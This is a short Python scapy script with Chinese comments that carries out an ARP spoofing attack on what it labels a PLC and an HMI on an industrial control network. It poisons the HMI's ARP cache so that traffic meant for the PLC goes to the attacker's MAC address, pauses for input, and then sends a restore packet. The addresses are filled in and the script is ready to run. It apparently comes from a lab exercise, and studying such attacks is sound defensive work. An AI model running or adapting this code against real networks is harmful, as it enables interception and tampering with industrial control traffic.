from scapy.all import *

# 发送ARP欺骗包
def send_arp_attack(target_ip, target_mac, spoofed_ip, spoofed_mac):
    arp_attack = Ether(dst=target_mac,src = spoofed_mac) /ARP(op=2, psrc=spoofed_ip, hwsrc=spoofed_mac, pdst=target_ip)  # 填入IP地址和mac地址
    sendp(arp_attack, iface = "以太网 5",verbose=False)
    print("ARP欺骗攻击已执行")


# 发送ARP恢复包
def send_arp_restore(target_ip, target_mac, spoofed_ip, spoofed_mac):
    arp_restore = Ether(dst=target_mac) / ARP(op=2, psrc=spoofed_ip, hwsrc=spoofed_mac, pdst=target_ip)  # 填入IP地址和mac地址
    sendp(arp_restore, iface = "以太网 5",verbose=False)
    print("ARP恢复操作已执行")


plc = sr1(ARP(pdst="192.168.1.3"))
print("PLC:")
plc.show()

hmi = sr1(ARP(pdst="192.168.1.4"))
print("HMI:")
hmi.show()

# 执行ARP欺骗攻击
send_arp_attack("192.168.1.4", "e0:dc:a0:30:3e:5e", "192.168.1.3", "00:0e:c6:29:84:34")
# 将最后一个参数填入自己的mac地址，可以欺骗HMI发送信息到错误的地址
#00:0e:c6:29:84:34
n = input()

# 执行ARP恢复操作
send_arp_restore("192.168.1.4", "e0:dc:a0:30:3e:5e", "192.168.1.3", "e0:dc:a0:36:bf:06")
# 将最后一个地址改回正确的PLC的mac地址，调用此函数时需要将send_arp_attack注释，否则无法正确修改恢复
